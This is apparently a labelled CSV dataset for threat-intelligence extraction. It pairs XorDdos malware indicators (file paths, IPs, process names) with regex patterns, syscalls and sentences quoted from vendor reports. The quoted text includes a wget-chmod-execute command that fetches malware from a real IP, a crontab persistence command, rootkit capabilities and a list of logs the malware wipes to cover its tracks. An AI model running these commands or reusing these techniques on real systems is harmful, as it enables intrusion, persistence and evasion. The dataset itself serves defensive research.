report,word,verb,objectType,prettyReg,match,label,asgSyscall,sentence
Xorddos-Intezer.csv,/etc/init.d/po1kitd-update,,FILE,/etc/init\.d/.*,0,0,,The following files are created after executing the malware on boot: /usr/syno/etc/rc.d/S99po1kitd-update.sh /etc/init.d/po1kitd-update /etc/rc2.d/S99po1kitd-update The malware checks if the rootkit is active by creating a file and removing it.
Xorddos-Intezer.csv,"permission,",,FILE,Permission,0,0,,"The file’s data used in both functions are: path, name, type, user, permission, size, time."
Xorddos-Intezer.csv,/usr/syno/etc/rc.d/S99po1kitd-update.sh,,FILE,/etc/rc.*\.d/.*,0,0,,The following files are created after executing the malware on boot: /usr/syno/etc/rc.d/S99po1kitd-update.sh /etc/init.d/po1kitd-update /etc/rc2.d/S99po1kitd-update The malware checks if the rootkit is active by creating a file and removing it.
Xorddos-Intezer.csv,127.0.0.1,send,NET,ip_addr,1,1,send(),Table 2: Data collected by the malware and sent back to the C2 server URL key	Description	Comment hostip	IP	Hardcoded to 127.0.0.1 softtype		Hardcoded to “Linux” pscaddr	MAC address	 hostname	Machine name	 hosttar	Username	Possibly “host target” hostos	Distribution	Extracted from /etc/issue or /etc/redhat-release hostcpu	Clock speed	/proc/cpuinfo hostmem	Amount of memory	/proc/meminfo hostpack		Hardcoded to “Linux” lkmtag	Is rootkit enabled	 kernel	Kernel version	Extracted from unameFigure 12 shows the communication between RedXOR and the C2.
Xorddos-Intezer.csv,UID,,ID,^UID.*,0,0,,Figure 3: Similarity between PWNLNX and RedXOR of the UID and GID used with “lchown” function call
Xorddos-Intezer.csv,158.247.208.230,,NET,ip_addr,0,0,, Network update.cloudjscdn.com 158.247.208.230 34.92.228.216 Process name po1kitd-update-k
Xorddos-Intezer.csv,GID,,ID,^GID.*,0,0,,Figure 3: Similarity between PWNLNX and RedXOR of the UID and GID used with “lchown” function call
Xorddos-Ms.csv,/var/run/gcc.pid,,FILE,/var/run,0,0,,Encrypted strings	Decoded value m7A4nQ_/nA	/usr/bin/ m [(n3	/bin/ m6_6n3	/tmp/ m4S4nAC/n&ZV\x1aA/TB	/var/run/gcc.pid m.[$n__#4%\C\x1aB]0	/lib/libudev.so m.[$n3	/lib/ m4S4nAC/nA	/var/run/ !#Ff3VE.-7\x17V[_	cat resolv.conf <Encrypted_Remote_URL>	hxxp://aa.hostasa[.
Xorddos-Ms.csv,/var/run/gcc.pid,encrypt/overwrite,FILE,/var/run,1,1,write(),"  kill_process  The kill_process thread performs the following tasks:  Decodes encrypted strings Fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file Fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so Fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process Reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  The tcp_thread triggers the connection with the C2 server decoded earlier using decrypt_remotestr()."
Xorddos-Ms.csv,chkconfig,perform,PROC,^chkconfig$,1,1,clone(),"Additionally, it performs the following tasks on a provided $pid:  Fetches the process file name corresponding to the provided $pid Deletes the file for the provided $pid Deletes the installed init services: Deletes /etc/init.d/<file_name> For runlevels 1-5, unlinks and deletes /etc/rc<runlevel>.d/S90<file_name> Performs the command chkconfig –del <file_name> Performs the command update-rc.d <file_name> remove Ends the process that was provided as an argument."
Xorddos-Ms.csv,/etc/cron.hourly/gcc.sh.The,,FILE,/etc/cron\..*/.*,0,0,, Cron script  The malware creates a cron script at the location /etc/cron.hourly/gcc.sh.The cron script passes parameters with the following content:  Screenshot of the contents of the gcc.sh script.
Xorddos-Ms.csv,/etc/rc<run_level>.d/S90<base_file_name>,,FILE,/etc/rc.*\.d/.*,0,0,,The malware creates a symlink for the init script dropped at the location /etc/init.d/<base_file_name> with the directories associated with runlevels 1 through 5 at /etc/rc<run_level>.d/S90<base_file_name> and /etc/rc.d/rc<run_level>.d/S90<base_file_name>.
Xorddos-Ms.csv,/var/run/gcc.pid,read,FILE,/var,0,0,,"It performs the following tasks:  Reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the C2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string."
Xorddos-Ms.csv,/var/log/boot.log,contain/set,FILE,/boot,1,1,write(),"After running the ELF file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character: Sensitive File	Description /root/.bash_history	Contains the commands that were run earlier /var/log/wtmp	Contains login related record for users /var/log/btmp	Contains record of failed login attempt /var/log/lastlog	Contains the recent login information for users /var/log/secure	Contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges /var/log/boot.log	Contains information related to system boot and message logged via system startup processes /var/log/cron	Contains information related to cron job launch, success and failure error logs /var/log/dmesg	Contains information related to kernel ring buffer messages, hardware devices, drivers, etc."
Xorddos-Ms.csv,"UID,",,ID,^UID.*,0,0,," The following table describes the symbols found in the rootkit and their corresponding functionalities:  Function name  	Description   give_root  	Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0” module_hide	Hides the rootkit kernel module module_show	Unhides the rootkit kernel module get_udp_seq_show	Hides the UDP4 connection by hooking /proc/net/udpHides the UDP6 connection by hooking /proc/net/udp6 get_tcp_seq_show	Hides the TCP4 connection by hooking /proc/net/tcpHides the TCP6 connection by hooking /proc/net/tcp6 hide_udp4_port	Adds a provided port to a list of hidden UDP4 ports unhide_udp4_port	Deletes a provided port from a list of hidden UDP4 ports hide_udp6_port	Adds a provided port to a list of hidden UDP6 ports unhide_udp6_port	Deletes a provided port from a list of hidden UDP6 ports hide_tcp4_port	Adds a provided port to a list of hidden TCP4 ports unhide_tcp4_port	Deletes a provided port from a list of hidden TCP4 ports hide_tcp6_port	Adds a provided port to a list of hidden TCP6 ports unhide_tcp6_port	Deletes a provided port from a list of hidden TCP6 ports unhide_allz	Iterates list of all hidden ports and deletes all entries firewall_acceptip	Adds an IP address provided to accept_ips list unfirewall_acceptip	Deletes a provided entry from accept_ips list firewall_dropip	Adds a provided IP address to drop_ips list unfirewall_dropip	Deletes a provided IP address to drop_ips list hide_proc	Adds a provided entry to hidden_procs list unhide_proc	Deletes a provided entry to hidden_procs list"
Xorddos-Ms.csv,/var/run/gcc.pid,read,FILE,/var/run/.*,0,0,,"It performs the following tasks:  Reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the C2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string."
Xorddos-Ms.csv,PID,contain,ID,^PID.*,0,0,,"A user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:  /proc/7728 – Contains process-id (PID) 7728-related information /proc/698 – Contains PID 698-related information Running the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command."
Xorddos-Ms.csv,PIDs,run,ID,^PID.*,0,0,,"The malware first runs without any argument and then later runs another instance with different arguments, such as PIDs and fake commands, to perform capabilities like clean-up, spoofing, and persistence."
Xorddos-Ms.csv,/var/run/gcc.pid,,FILE,/var,0,0,,Encrypted strings	Decoded value m7A4nQ_/nA	/usr/bin/ m [(n3	/bin/ m6_6n3	/tmp/ m4S4nAC/n&ZV\x1aA/TB	/var/run/gcc.pid m.[$n__#4%\C\x1aB]0	/lib/libudev.so m.[$n3	/lib/ m4S4nAC/nA	/var/run/ !#Ff3VE.-7\x17V[_	cat resolv.conf <Encrypted_Remote_URL>	hxxp://aa.hostasa[.
Xorddos-Ms.csv,/proc/rs_dev,use,FILE,/proc/rs_dev,0,0,, XorDdos uses /proc/rs_dev character device to communicate with the rootkit.
Xorddos-Ms.csv,/var/run/gcc.pid,encrypt/overwrite,FILE,/var,1,1,write(),"  kill_process  The kill_process thread performs the following tasks:  Decodes encrypted strings Fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file Fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so Fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process Reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  The tcp_thread triggers the connection with the C2 server decoded earlier using decrypt_remotestr()."
Xorddos-Ms.csv,/var/run/.,create,FILE,/var/run,1,1,open(),"If it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/."
Xorddos-Ms.csv,sh,find/spawn,PROC,^sh$,1,1,clone(), The fake commands can include:  cat resolv.conf netstat -an bash whoami id cd /etc ifconfig eth0 ifconfig echo “find” uptime sh top gnome-terminal su netstat -antop grep “A” who ls -la pwd route -n ps -ef ls sleep 1
Xorddos-Ms.csv,/var/run/gcc.pid,,FILE,/var/run/.*,0,0,,Encrypted strings	Decoded value m7A4nQ_/nA	/usr/bin/ m [(n3	/bin/ m6_6n3	/tmp/ m4S4nAC/n&ZV\x1aA/TB	/var/run/gcc.pid m.[$n__#4%\C\x1aB]0	/lib/libudev.so m.[$n3	/lib/ m4S4nAC/nA	/var/run/ !#Ff3VE.-7\x17V[_	cat resolv.conf <Encrypted_Remote_URL>	hxxp://aa.hostasa[.
Xorddos-Ms.csv,/etc/crontab,,FILE,/etc/crontab,0,0,,It reads system(sed -i \'/\\/etc\\/cron.hourly\\/gcc.sh/d\' /etc/crontab && echo \'*/3 * * * * root /etc/cron.hourly/gcc.sh\' >> /etc/crontab); Figure 13.
Xorddos-Ms.csv,/proc/rs_dev,have/add,FILE,/proc/rs_dev,1,1,open(),"In this case, the malware has a provision for communicating with its rootkit component /proc/rs_dev by sending input and output control (IOCTL) calls with additional information to take appropriate action."
Xorddos-Ms.csv,/var/run/gcc.pid,encrypt/overwrite,FILE,/var/run/.*,1,1,write(),"  kill_process  The kill_process thread performs the following tasks:  Decodes encrypted strings Fetches file stats for /var/run/gcc.pid or, if none exist, then creates the file Fetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.so Fetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current process Reads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as: md5= filename= rmfile= denyip= tcp_thread  The tcp_thread triggers the connection with the C2 server decoded earlier using decrypt_remotestr()."
Xorddos-Ms.csv,/etc/cron.hourly/gcc.sh,delete,FILE,/etc/cron\..*/.*,0,0,, It then creates a /etc/crontab file to run /etc/cron.hourly/gcc.sh every three minutes:  Screenshot displaying the system command to delete the /etc/cron.hourly/gcc.sh entry from /etc/crontab file and add a new entry.
Xorddos-Ms.csv,chkconfig,add,PROC,^chkconfig$,0,0,,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
Xorddos-Ms.csv,/etc/init.d/HFLgGwYfSC.elf,drop,FILE,/etc/init\.d/.*,1,1,open(),Content of the init script dropped at the location /etc/init.d/HFLgGwYfSC.elf
Xorddos-Ms.csv,/etc/init.d/HFLgGwYfSC.elf.,,FILE,/etc/init\.d/.*,0,0,,Screenshot of the content of the init script dropped at the location /etc/init.d/HFLgGwYfSC.elf.
Xorddos-Ms.csv,/proc/self/exe,call/fetch,FILE,/proc/self,1,1,readlink(),"Before handling the argument-based control, it calls the readlink API with the first parameter as /proc/self/exe to fetch its full process path."
Xorddos-Ms.csv,"PID,",,ID,^PID.*,0,0,," 2: Clean-up code path  In this code path, the malware runs with another argument provided as the PID, for example:  /usr/bin/jwvwvxoupv 4849 Using the above example, the malware shares the 64-byte size memory segment with the IPC key “0xDA718716” to check for another malware process provided as an argument."
Xorddos-Ms.csv,/var/run/.,create,FILE,/var,1,1,open(),"If it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/."
Xorddos-Ms.csv,/var/run/.,create,FILE,/var/run/.*,1,1,open(),"If it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/."
Xorddos-Ms.csv,“0xDA718716”,,MEM,mem_addr,0,0,," 2: Clean-up code path  In this code path, the malware runs with another argument provided as the PID, for example:  /usr/bin/jwvwvxoupv 4849 Using the above example, the malware shares the 64-byte size memory segment with the IPC key “0xDA718716” to check for another malware process provided as an argument."
Xorddos-Ms.csv,/etc/crontab,delete,FILE,/etc/crontab,0,0,, It then creates a /etc/crontab file to run /etc/cron.hourly/gcc.sh every three minutes:  Screenshot displaying the system command to delete the /etc/cron.hourly/gcc.sh entry from /etc/crontab file and add a new entry.
Xorddos-Ms.csv,/proc/rs_dev.,,FILE,/proc/rs_dev,0,0,,The rootkit becomes accessible to the XorDdos malware by using the device handle /proc/rs_dev.
Xorddos-Ms.csv,update-rc.d,,PROC,^update-rc.d$,0,0,,The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.
Xorddos-Ms.csv,chkconfig,install,PROC,^chkconfig$,0,0,,Screenshot displaying chkconfig and update-rc.d commands installing the startup service Figure 16. chkconfig and update-rc.d commands install the startup service Argument-based code-flow XorDdos has specific code paths corresponding to the number of arguments provided to the program.
Xorddos-Ms.csv,/var/run/gcc.pid,read,FILE,/var/run,0,0,,"It performs the following tasks:  Reads the content of the file /var/run/gcc.pid to get a unique 32-byte magic string that identifies the device while connecting with the C2 server; if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string."
Xorddos-Ms.csv,/var/log/btmp,contain,FILE,/var,0,0,,"After running the ELF file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character: Sensitive File	Description /root/.bash_history	Contains the commands that were run earlier /var/log/wtmp	Contains login related record for users /var/log/btmp	Contains record of failed login attempt /var/log/lastlog	Contains the recent login information for users /var/log/secure	Contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges /var/log/boot.log	Contains information related to system boot and message logged via system startup processes /var/log/cron	Contains information related to cron job launch, success and failure error logs /var/log/dmesg	Contains information related to kernel ring buffer messages, hardware devices, drivers, etc."
Xorddos-Ms.csv,/var/log/wtmp,run,FILE,/var,0,0,,"After running the ELF file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character: Sensitive File	Description /root/.bash_history	Contains the commands that were run earlier /var/log/wtmp	Contains login related record for users /var/log/btmp	Contains record of failed login attempt /var/log/lastlog	Contains the recent login information for users /var/log/secure	Contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges /var/log/boot.log	Contains information related to system boot and message logged via system startup processes /var/log/cron	Contains information related to cron job launch, success and failure error logs /var/log/dmesg	Contains information related to kernel ring buffer messages, hardware devices, drivers, etc."
Xorddos-Ms.csv,GID,assign/get,ID,^GID.*,1,1,getegid() getgid()," The following table describes the symbols found in the rootkit and their corresponding functionalities:  Function name  	Description   give_root  	Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0” module_hide	Hides the rootkit kernel module module_show	Unhides the rootkit kernel module get_udp_seq_show	Hides the UDP4 connection by hooking /proc/net/udpHides the UDP6 connection by hooking /proc/net/udp6 get_tcp_seq_show	Hides the TCP4 connection by hooking /proc/net/tcpHides the TCP6 connection by hooking /proc/net/tcp6 hide_udp4_port	Adds a provided port to a list of hidden UDP4 ports unhide_udp4_port	Deletes a provided port from a list of hidden UDP4 ports hide_udp6_port	Adds a provided port to a list of hidden UDP6 ports unhide_udp6_port	Deletes a provided port from a list of hidden UDP6 ports hide_tcp4_port	Adds a provided port to a list of hidden TCP4 ports unhide_tcp4_port	Deletes a provided port from a list of hidden TCP4 ports hide_tcp6_port	Adds a provided port to a list of hidden TCP6 ports unhide_tcp6_port	Deletes a provided port from a list of hidden TCP6 ports unhide_allz	Iterates list of all hidden ports and deletes all entries firewall_acceptip	Adds an IP address provided to accept_ips list unfirewall_acceptip	Deletes a provided entry from accept_ips list firewall_dropip	Adds a provided IP address to drop_ips list unfirewall_dropip	Deletes a provided IP address to drop_ips list hide_proc	Adds a provided entry to hidden_procs list unhide_proc	Deletes a provided entry to hidden_procs list"
Xorddos-Trendmicro.csv,/etc/cron.hourly/gcc.sh,drop,FILE,/etc/cron\..*/.*,1,1,open(), This Backdoor drops the following files:  /etc/cron.hourly/gcc.sh (Cron is a time-based job scheduler in Unix-like computer operating systems) Backdoor Routine
Xorddos-Trendmicro.csv,/var/run/gcc.pid,read,FILE,/var/run,0,0,,Creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/S90{random numbers} /etc/rc.d/rc{1-5}.d/S90{random numbers} Get the magic string value from the file /var/run/gcc.pid Read the following from its configuration file: md5 - checksum of file denyip - open communication with an IP filename - list of filename rmfile - files to remove
Xorddos-Trendmicro.csv,/etc/rc{1-5}.d/S90{random,,FILE,/etc/rc.*\.d/.*,0,0,,Creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/S90{random numbers} /etc/rc.d/rc{1-5}.d/S90{random numbers} Get the magic string value from the file /var/run/gcc.pid Read the following from its configuration file: md5 - checksum of file denyip - open communication with an IP filename - list of filename rmfile - files to remove
Xorddos-Trendmicro.csv,/var/run/gcc.pid,read,FILE,/var,0,0,,Creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/S90{random numbers} /etc/rc.d/rc{1-5}.d/S90{random numbers} Get the magic string value from the file /var/run/gcc.pid Read the following from its configuration file: md5 - checksum of file denyip - open communication with an IP filename - list of filename rmfile - files to remove
Xorddos-Trendmicro.csv,PID,gather/get,ID,^PID.*,1,1,getpid() getppid(), Information Theft  This Backdoor gathers the following data:  Memory Information CPU Information Network Speed PID of Running Process MD5 of Running Process Other Details
Xorddos-Trendmicro.csv,/var/run/gcc.pid,read,FILE,/var/run/.*,0,0,,Creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/S90{random numbers} /etc/rc.d/rc{1-5}.d/S90{random numbers} Get the magic string value from the file /var/run/gcc.pid Read the following from its configuration file: md5 - checksum of file denyip - open communication with an IP filename - list of filename rmfile - files to remove
Xorddos-Trendmicro.csv,permission,have,FILE,Permission,0,0,,"There are times that the DS agent doesn’t have permission to the locked file, so make sure that there’s no running process or service of XORDDOS (random characters), to fully clean this infection."
Xorddos-Trendmicro2.csv,http://122.51.133.49:10086/VIP,wget,NET,ip_addr,1,1,send(),"Afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the XORDDoS malware:  wget http://122.51.133.49:10086/VIP –O VIP chmod 777 VIP ./VIP The XORDDoS payload (detected by Trend Micro as Backdoor.Linux.XORDDOS.AE) still used the XOR-key it used in other recorded attacks, BB2FA36AAA9541F0, to encrypt its strings and to communicate with the command and control (C&C) server."
Xorddos-Trendmicro2.csv,http://62.171.160.189/linux_arm,find,NET,ip_addr,0,0,, Indicators of Compromise Kaiji  File name	SHA 256	Trend Micro pattern detection 123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	Trojan.SH.KAIJI.A linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	DDoS.Linux.KAIJI.A Related URLs:  http://62.171.160.189/linux_arm http://62.171.160.189/11/123.sh XORDDoS and other malware variants found through the same URL  SHA 256	Trend Micro pattern detection dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	Backdoor.Linux.XORDDOS.AE 6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	Backdoor.Linux.DOFLOO.AB 286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	Backdoor.Win32.SDDOS.A Related URL:  http://122.51.133.49:10086/VIP
Xorddos-Trendmicro2.csv,http://122.51.133.49:10086/VIP,,NET,ip_addr+port,0,0,, Indicators of Compromise Kaiji  File name	SHA 256	Trend Micro pattern detection 123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	Trojan.SH.KAIJI.A linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	DDoS.Linux.KAIJI.A Related URLs:  http://62.171.160.189/linux_arm http://62.171.160.189/11/123.sh XORDDoS and other malware variants found through the same URL  SHA 256	Trend Micro pattern detection dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	Backdoor.Linux.XORDDOS.AE 6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	Backdoor.Linux.DOFLOO.AB 286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	Backdoor.Win32.SDDOS.A Related URL:  http://122.51.133.49:10086/VIP
Xorddos-Trendmicro2.csv,PID,initiate,ID,^PID.*,0,0,,"  The payload linux_arm, which is the Kaiji DDoS malware, initiated the following DDoS attacks:  ACK attack IPS spoof attack SSH attack SYN attack SYNACK attack TCP flood attack UDP flood attack This malware also gathered the following data, which it can use for the aforementioned attacks:  CPU Information Directories Domain Name Host IP address PID of Running Process URL scheme Defending Docker servers As seen in these findings, threat actors behind malware variants constantly upgrade their creations with new capabilities so that they can deploy their attacks against other entry points."
Xorddos-Trendmicro2.csv,PID,gather/get,ID,^PID.*,1,1,getpid() getppid(),"  It gathered the following data, which are relevant to its attempt to initiate a DDoS attack:  CPU Information MD5 of Running Process Memory Information Network Speed PID of Running Process It should be noted that most of the behaviors exhibited by this particular XORDDoS variant have already been observed in earlier variants of the malware."
Xorddos-Trendmicro2.csv,http://122.51.133.49:10086/VIP,,NET,ip_addr,0,0,, Indicators of Compromise Kaiji  File name	SHA 256	Trend Micro pattern detection 123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	Trojan.SH.KAIJI.A linux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	DDoS.Linux.KAIJI.A Related URLs:  http://62.171.160.189/linux_arm http://62.171.160.189/11/123.sh XORDDoS and other malware variants found through the same URL  SHA 256	Trend Micro pattern detection dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	Backdoor.Linux.XORDDOS.AE 6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	Backdoor.Linux.DOFLOO.AB 286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	Backdoor.Win32.SDDOS.A Related URL:  http://122.51.133.49:10086/VIP
Xorddos-Trendmicro2.csv,http://122.51.133.49:10086/VIP,wget,NET,ip_addr+port,1,1,send(),"Afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the XORDDoS malware:  wget http://122.51.133.49:10086/VIP –O VIP chmod 777 VIP ./VIP The XORDDoS payload (detected by Trend Micro as Backdoor.Linux.XORDDOS.AE) still used the XOR-key it used in other recorded attacks, BB2FA36AAA9541F0, to encrypt its strings and to communicate with the command and control (C&C) server."
